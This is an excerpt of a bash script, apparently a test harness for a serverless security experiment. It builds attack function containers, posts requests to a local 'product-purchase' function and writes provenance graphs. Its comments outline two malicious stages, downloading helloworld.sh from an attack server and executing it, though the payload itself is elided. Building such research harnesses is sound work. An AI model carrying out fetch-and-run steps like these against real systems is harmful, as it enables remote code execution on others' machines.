...
for((i=1; i<=repeat_count; i++)); do
    ...
    ./Init_proxy_func.sh
    ./build_grafaas_proxy.sh
    ##여기에 어택을 위한 함수 컨테이너들을 올리는 작업을 해야함
    ./attack-helloworld/build.sh
    ...
    # malicious: one  ==>  attackserver로 부터 helloworld.sh 다운
    ...
    # curl 명령어로 POST 요청 수행 (10초 타임아웃 설정)
    # malicioust: two  ==>  helloworld.sh 실행
    response=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
        -X POST http://localhost:80/function/product-purchase \
        -H "Content-Type: application/json" \
        -d '{
    ...
    GRAPHS_DIR="./graphs/graphs_helloworld"
    GRAPHS_DOT_DIR="./graphs/graphs_helloworld_dot"
